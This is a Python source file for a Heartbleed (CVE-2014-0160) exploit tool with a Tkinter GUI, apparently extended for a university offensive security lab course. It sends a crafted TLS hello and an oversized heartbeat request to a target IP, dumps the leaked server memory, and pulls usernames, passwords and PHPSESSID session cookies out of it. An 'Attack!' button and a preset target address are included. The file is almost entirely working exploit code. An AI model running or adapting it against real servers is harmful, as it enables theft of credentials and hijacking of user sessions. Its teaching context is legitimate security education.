#!/usr/bin/python

# Quick demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code
# Minor customizations by Malik Mesellem (@MME_IT)
# New options added for the course Lab on Offensive Computer Security TU/e (2019):
#   - Claudiu Ion (TU/e)
#   - Leon van de Beek (TU/e)

import sys
import struct
import socket
import time
import select
import re
from Tkinter import *
from optparse import OptionParser

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

# Explanation of heartbeat (hit_hb call):
#    18      : hearbeat record
#    03 02   : TLS version
#    00 03   : length
#    01      : hearbeat request
#    40 00   : payload length 16 384 bytes check rfc6520
#              The total length of a HeartbeatMessage MUST NOT exceed 2^14
#              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes


def logList(list, name, color, delim = ''):
    # Return without printing (if quite option specified by user)
    try:
        if len(list) < 1:
            return
    except TypeError:
        return

    # Build message string
    # Use delim to detect whether we are printing cookies (cookies are printed on separate lines)
    if delim == '\n':
        header = color + name + colors.END + ': '
        msg = ''
    else:
        header = ''
        msg = color + name + colors.END + ': '

    for item in list:
        msg += header + item + ' ' + delim

    print(msg)

def skip(info, pos, stop):
    while stop.find(info[pos]) == -1:
        pos += 1
    return pos

# method extracts usernames, passwords and session ids (cookies) from leaked info
def getCredentials(info, key):
    items = []

     # If key is not found in the output return
    if info.find(key) != -1:
        i = info.index(key)
    else:
        return

    while i < len(info):
        # Find next user from info string
        i = skip(info, i, '=')
        # Strip current user from info string
        info = info[i+1:]
        # Get username of current user (and add to users list)
        i = skip(info, 0, '&.;')
        items.append(info[:i])
        output.insert('end', key + ": " + info[:i] + "\n")
        # Strip current username from info string
        info = info[i+1:]
        i = len(info)
        if info.find(key) != -1:
            i = info.index(key)
    return items

def hexdump(s):

    file = FILE_text.get()
    key = KEY_text.get()

    # Open output file (if specified by user)
    if len(file) > 0:
        status.set('DONE: memory dump was saved in output file.')
        output = open(file, 'a')

    # Variables for detecting passwords and cookies in memory dump
    hasPwd = False;
    hasCookie = False;
    info = ''

    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)

        info += pdat

        # Skip printing empty lines (lines that do not decode to useful information
        # If verbose option specified by user empty lines are printed
        _temp = pdat.replace('.','')
        if len(_temp) > 0:
            if len(file) > 0:
                output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
            else:
                status.set('  %04x: %-48s %s' % (b, hxdat, pdat))

    # Detect whether passwords or cookies are present in the leaked memory
    if pdat.find('pas'):
        hasPwd = True
    if pdat.find('Cookie'):
        hasCookie = True

    # Get user names from leaked memory
    users = getCredentials(info, 'login')
    # Get user passwords from leaked memory
    passwords = getCredentials(info, 'password')
    # Get user cookie from leaked memory
    cookies = getCredentials(info, 'PHPSESSID')
    # Search for key provided by user (if any)
    query = []
    if len(key) > 0:
        query = getCredentials(info, key)

    if len(file) == 0:
        print

    return users, passwords, cookies, query, hasPwd, hasCookie

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        status.set('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        status.set('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    _tmp = ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    status.set(_tmp)
    return typ, ver, pay

def hit_hb(s, file, key):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            status.set('ERROR: no heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            status.set('Received heartbeat response:')
            # Parse information from heartbeat response
            users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay)

            # Log to console the list of users
            logList(users, 'USERS', colors.OKBLUE)
            # Log to console the list of passwords
            logList(passwords, 'PASSWORDS', colors.OKBLUE)
            # Log to console the list of cookies
            logList(cookies, 'COOKIE', colors.OKBLUE, '\n')

            # If user specified a key, then log search results
            if len(key) > 0:
                if len(query) > 0:
                    logList(query, 'QUERY (key)', colors.HEADER, '\n')
                else:
                    status.set('QUERY (key): no results')

            if hasCookie:
                status.set('COOKIE: server returned cookies - check output')
            if hasPwd:
                status.set('PASSWORD: server returned passwords - check output')

            if len(pay) > 3:
                status.set('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                status.set('ERROR: server processed malformed heartbeat, but did not return any extra data.')

            return True

        if typ == 21:
            status.set('Received alert:')
            hexdump(pay)
            status.set('ERROR: server returned error, likely not vulnerable')
            return False

def execute():
    e1.config(state = 'disabled')
    e2.config(state = 'disabled')
    e3.config(state = 'disabled')
    e4.config(state = 'disabled')
    e5.config(state = 'disabled')
    output.config(state = 'normal')
    output.insert(END, 'Items that were returned by Heartbeat: \n')
    status.set('Please wait while performing the attack...')
    updatescreen()

    IP = IP_text.get()
    PORT = PORT_text.get()
    TIMES = TIMES_text.get()
    FILE = FILE_text.get()
    KEY = KEY_text.get()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    status.set('Connecting...')
    updatescreen()
    sys.stdout.flush()
    s.connect((IP, PORT))

    status.set('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)

    status.set('Waiting for Server Hello...')
    sys.stdout.flush()

    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            status.set('Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    for i in range(TIMES):
      _tmp = 'Sending heartbeat request #' + str(i+1) + '!'
      status.set(_tmp)
      sys.stdout.flush()
      s.send(hb)
      hit_hb(s, FILE, KEY)

    e1.config(state = 'normal')
    e2.config(state = 'normal')
    e3.config(state = 'normal')
    e4.config(state = 'normal')
    e5.config(state = 'normal')

# ****************  GUI starts here *******************

window = Tk()
separator = Frame(height=2, bd=1)
separator.pack(fill=X, pady=20)
topframe = Frame(window)
topframe.pack(side = TOP, fill = BOTH)
separator2 = Frame(height=2, bd=1)
separator2.pack(fill=X, pady=10)
middleframe = Frame(window)
middleframe.pack(fill = BOTH)
bottomframe = Frame(window)
window.title("Heartbleed bug toolkit")


widthwindow = 800
heightwindow = 500
screenwidth = window.winfo_screenwidth()
screenheight = window.winfo_screenheight()
xcoord = (screenwidth / 2) - (widthwindow / 2)
ycoord = (screenheight / 2) - (heightwindow / 2)
window.geometry("%dx%d+%d+%d" % (widthwindow, heightwindow, xcoord, ycoord))

topframe.grid_rowconfigure(0, weight=2)
topframe.grid_rowconfigure(4, weight=2)
topframe.grid_rowconfigure(3, weight=1)
topframe.grid_rowconfigure(6, weight=2)

topframe.grid_columnconfigure(4, weight=1)
topframe.grid_columnconfigure(0, weight=1)
topframe.grid_columnconfigure(2, weight=1)

bottomframe.pack(side = BOTTOM, fill = X)


l1 = Label(topframe, text = "IP address to attack: ")
l1.grid(row = 1, column = 1)

l2 = Label(topframe, text = "Port to attack (Default 8443): ")
l2.grid(row = 2, column = 1)

l3 = Label(topframe, text = "Times to send heartbeat: ")
l3.grid(row = 3, column = 1)

l4 = Label(topframe, text = "(Optional) Insert filename to dump to: ")
l4.grid(row = 4, column = 1)

l5 = Label(topframe, text = "(optional) Insert additional keyword: ")
l5.grid(row = 5, column = 1)

IP_text = StringVar()
IP_text.set("192.168.43.23")
e1 = Entry(topframe, textvariable = IP_text)
e1.grid(row = 1, column = 3)

PORT_text = IntVar()
PORT_text.set(8443)
e2 = Entry(topframe, textvariable = PORT_text)
e2.grid(row = 2, column = 3)

TIMES_text = IntVar()
TIMES_text.set(1)
e3 = Entry(topframe, textvariable = TIMES_text)
e3.grid(row = 3, column = 3)

FILE_text = StringVar()
FILE_text.set("")
e4 = Entry(topframe, textvariable = FILE_text)
e4.grid(row = 4, column = 3)

KEY_text = StringVar()
KEY_text.set("")
e5 = Entry(topframe, textvariable = KEY_text)
e5.grid(row = 5, column = 3)

sep = Label(topframe)
sep.grid(row = 6, column = 3)

b1 = Button(topframe, text = "Attack!", command = execute)
b1.grid(row = 7, column = 3)

status = StringVar()
status.set("Press Start button to start the attack.")
statusbar = Label(bottomframe, textvariable = status , bd = 1, relief = SUNKEN, anchor = W)
statusbar.pack(side = BOTTOM, fill = X)

output = Text(middleframe, width = 80, height = 10)
output.config(state = 'disabled')
output.pack()

def updatescreen():
    window.after(1000, updatescreen)

window.mainloop()

if __name__ == '__main__':
    updatescreen()
